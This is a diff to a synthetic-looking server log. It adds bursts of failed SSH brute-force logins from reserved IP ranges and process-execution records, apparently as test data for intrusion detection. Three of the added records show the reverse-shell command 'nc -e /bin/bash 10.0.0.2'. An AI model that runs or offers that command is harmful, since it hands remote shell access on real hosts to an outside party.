@@ -1,15 +1,71 @@
 Aug 24 01:40:01 my-server sshd[1234]: pam_unix(sshd:session): session opened for user bobby
 Aug 24 01:40:05 my-server sshd[1235]: Failed password for invalid user admin from 198.51.100.123 port 22 ssh2
 Aug 24 01:40:07 my-server sshd[1235]: Failed password for invalid user admin from 198.51.100.123 port 22 ssh2
-Aug 24 01:40:08 my-server sshd[1236]: Accepted password for user bobby from 10.0.0.5 port 54321 ssh2
-Aug 24 01:40:09 my-server sshd[1235]: Failed password for invalid user admin from 198.51.100.123 port 22 ssh2
-Aug 24 01:40:12 my-server sshd[1235]: Failed password for invalid user admin from 198.51.100.123 port 22 ssh2
-Aug 24 01:40:15 my-server sshd[1235]: Failed password for invalid user admin from 198.51.100.123 port 22 ssh2
-Aug 24 01:40:20 my-server sshd[1237]: Failed password for root from 203.0.113.10 port 4444 ssh2
-Aug 24 02:20:00 my-server sshd[6666]: Failed password for user hacker from 10.10.10.10 port 22 ssh2
-Aug 24 02:20:00 my-server sshd[6666]: Failed password for user hacker from 10.10.10.10 port 22 ssh2
-Aug 24 02:20:00 my-server sshd[6666]: Failed password for user hacker from 10.10.10.10 port 22 ssh2
-Aug 24 02:20:00 my-server sshd[6666]: Failed password for user hacker from 10.10.10.10 port 22 ssh2
-Aug 24 02:20:00 my-server sshd[6666]: Failed password for user hacker from 10.10.10.10 port 22 ssh2
-Aug 24 02:20:00 my-server sshd[6666]: Failed password for user hacker from 10.10.10.10 port 22 ssh2
 
+Aug  30 15:19:11 my-server sshd[4228]: Failed password for root from 198.51.100.217 port 57343 ssh2
+Aug  30 15:19:11 my-server sshd[4607]: Failed password for root from 198.51.100.217 port 41914 ssh2
+Aug  30 15:19:11 my-server sshd[3764]: Failed password for root from 198.51.100.217 port 50228 ssh2
+Aug  30 15:19:11 my-server sshd[6930]: Failed password for root from 198.51.100.217 port 9204 ssh2
+Aug  30 15:19:11 my-server sshd[7365]: Failed password for root from 198.51.100.217 port 51898 ssh2
+Aug  30 15:19:11 my-server sshd[3835]: Failed password for root from 198.51.100.217 port 50008 ssh2
+Aug  30 15:19:12 my-server sshd[5243]: Failed password for root from 198.51.100.187 port 5594 ssh2
+Aug  30 15:19:12 my-server sshd[7199]: Failed password for root from 198.51.100.187 port 37872 ssh2
+Aug  30 15:19:12 my-server sshd[9575]: Failed password for root from 198.51.100.187 port 32467 ssh2
+Aug  30 15:19:12 my-server sshd[3930]: Failed password for root from 198.51.100.187 port 6292 ssh2
+Aug  30 15:19:12 my-server sshd[8605]: Failed password for root from 198.51.100.187 port 18804 ssh2
+Aug  30 15:19:12 my-server sshd[7170]: Failed password for root from 198.51.100.187 port 12201 ssh2
+Aug  30 15:19:15 my-server sshd[7811]: Failed password for admin from 10.10.10.180 port 14848 ssh2
+15:19:18 1000    nc               9071    18981   0   nc -e /bin/bash 10.0.0.2
+Aug  30 15:19:20 my-server sshd[8449]: Failed password for admin from 10.10.10.101 port 21990 ssh2
+15:19:21 1000    nc               2647    36234   0   nc -e /bin/bash 10.0.0.2
+Aug  30 15:19:24 my-server sshd[8358]: Failed password for admin from 10.10.10.134 port 28389 ssh2
+15:19:28 1000    nc               2719    42814   0   nc -e /bin/bash 10.0.0.2
+Aug  30 15:19:30 my-server sshd[4755]: Failed password for root from 198.51.100.248 port 43905 ssh2
+Aug  30 15:19:30 my-server sshd[2217]: Failed password for root from 198.51.100.248 port 57670 ssh2
+Aug  30 15:19:30 my-server sshd[2379]: Failed password for root from 198.51.100.248 port 42305 ssh2
+Aug  30 15:19:30 my-server sshd[7374]: Failed password for root from 198.51.100.248 port 57012 ssh2
+Aug  30 15:19:30 my-server sshd[4865]: Failed password for root from 198.51.100.248 port 55683 ssh2
+Aug  30 15:19:30 my-server sshd[7307]: Failed password for root from 198.51.100.248 port 60838 ssh2
+15:19:33 1000    ls               27104   89758   0   /bin/ls
+15:19:33 1000    ls               25713   42330   0   /bin/ls
+15:19:33 1000    ls               69673   13714   0   /bin/ls
+15:19:33 1000    ls               38662   9911    0   /bin/ls
+15:19:33 1000    ls               1199    63823   0   /bin/ls
+15:19:33 1000    ls               23804   52388   0   /bin/ls
+15:19:33 1000    ls               64074   90691   0   /bin/ls
+15:19:34 1000    ls               79934   30736   0   /bin/ls
+15:19:34 1000    ls               33737   69031   0   /bin/ls
+15:19:34 1000    ls               20539   79816   0   /bin/ls
+15:19:34 1000    ls               7682    51369   0   /bin/ls
+15:19:34 1000    ls               82377   83856   0   /bin/ls
+15:19:34 1000    ls               12841   62748   0   /bin/ls
+15:19:34 1000    ls               59968   25320   0   /bin/ls
+15:19:34 1000    ls               80426   77453   0   /bin/ls
+Aug  30 15:19:35 my-server sshd[4554]: Failed password for root from 198.51.100.110 port 54455 ssh2
+Aug  30 15:19:35 my-server sshd[2259]: Failed password for root from 198.51.100.110 port 26717 ssh2
+Aug  30 15:19:35 my-server sshd[1674]: Failed password for root from 198.51.100.110 port 3628 ssh2
+Aug  30 15:19:35 my-server sshd[1744]: Failed password for root from 198.51.100.110 port 8437 ssh2
+Aug  30 15:19:35 my-server sshd[4658]: Failed password for root from 198.51.100.110 port 39469 ssh2
+Aug  30 15:19:35 my-server sshd[4995]: Failed password for root from 198.51.100.110 port 8506 ssh2
+15:19:36 1000    ls               66036   21154   0   /bin/ls
+15:19:37 1000    ls               61341   45351   0   /bin/ls
+15:19:37 1000    ls               45733   90990   0   /bin/ls
+15:19:37 1000    ls               87874   53704   0   /bin/ls
+15:19:37 1000    ls               37239   34024   0   /bin/ls
+15:19:37 1000    ls               41064   6355    0   /bin/ls
+15:19:37 1000    ls               35031   4343    0   /bin/ls
+15:19:37 1000    ls               90438   41394   0   /bin/ls
+15:19:37 1000    ls               13351   60231   0   /bin/ls
+15:19:37 1000    ls               9934    36415   0   /bin/ls
+15:19:37 1000    ls               10494   28564   0   /bin/ls
+15:19:38 1000    ls               23859   47133   0   /bin/ls
+15:19:38 1000    ls               73872   32765   0   /bin/ls
+15:19:38 1000    ls               82326   50257   0   /bin/ls
+15:19:38 1000    ls               8892    72804   0   /bin/ls
+Aug  30 15:19:40 my-server sshd[1828]: Failed password for admin from 10.10.10.62 port 56603 ssh2
+Aug  30 15:19:43 my-server sshd[4854]: Failed password for root from 198.51.100.93 port 38405 ssh2
+Aug  30 15:19:43 my-server sshd[6209]: Failed password for root from 198.51.100.93 port 57630 ssh2
+Aug  30 15:19:43 my-server sshd[6265]: Failed password for root from 198.51.100.93 port 58728 ssh2
+Aug  30 15:19:43 my-server sshd[6639]: Failed password for root from 198.51.100.93 port 25281 ssh2
+Aug  30 15:19:43 my-server sshd[4366]: Failed password for root from 198.51.100.93 port 5994 ssh2
+Aug  30 15:19:43 my-server sshd[9252]: Failed password for root from 198.51.100.93 port 7590 ssh2
